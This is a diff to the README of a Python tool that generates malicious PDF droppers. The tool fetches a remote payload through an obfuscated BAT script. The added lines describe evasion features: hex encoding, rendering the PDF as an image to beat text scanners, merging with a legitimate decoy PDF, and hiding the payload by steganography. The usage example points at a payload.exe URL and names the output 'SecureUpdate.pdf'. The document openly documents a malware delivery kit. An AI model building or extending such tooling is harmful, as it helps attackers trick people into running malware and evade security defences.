@@ -12,7 +12,11 @@ Advanced HTML to PDF Delivery System - Stealth Edition.
     - Base64 Obfuscation
     - Variable Obfuscation
     - PowerShell Encoded Wrapper
-- **Custom Branding**: Option to inject custom image pages for added credibility.
+    - Hex Encoding
+- **Advanced Evasion Options**:
+    - **Image-Based Rendering**: Renders the HTML content as a full-page image inside the PDF to evade text-based scanners.
+    - **Decoy Merge**: Merge your dropper with a legitimate decoy PDF.
+    - **Steganography**: Hide the payload script within the branding image data.
 
 ## Setup
 
@@ -35,7 +39,7 @@ python magxxic_vot_dropex.py
 
 Or provide arguments:
 ```bash
-python magxxic_vot_dropex.py --payload_url "http://example.com/payload.exe" --html_template "template.html" --output_pdf "SecureUpdate.pdf" --crypt "PowerShell Encoded"
+python magxxic_vot_dropex.py --payload_url "http://example.com/payload.exe" --html_template "template.html" --output_pdf "SecureUpdate.pdf" --crypt "Hex Encoding" --image_based
 ```
 
 ### Arguments
@@ -44,7 +48,10 @@ python magxxic_vot_dropex.py --payload_url "http://example.com/payload.exe" --ht
 - `--html_template`: Path to the HTML file used as the PDF content. (Default: `template.html`)
 - `--image_path`: Path to an optional image file to include as an extra page.
 - `--output_pdf`: The name of the generated PDF file.
-- `--crypt`: Obfuscation method for the BAT file (`None`, `Base64`, `Variable Obfuscation`, `PowerShell Encoded`).
+- `--crypt`: Obfuscation method for the BAT file (`None`, `Base64`, `Variable Obfuscation`, `PowerShell Encoded`, `Hex Encoding`).
+- `--image_based`: Flag to render PDF content as an image.
+- `--decoy_pdf`: Path to a decoy PDF to merge with.
+- `--stego_image`: Path to an image to use for steganography.
 
 ## Template Customization
 
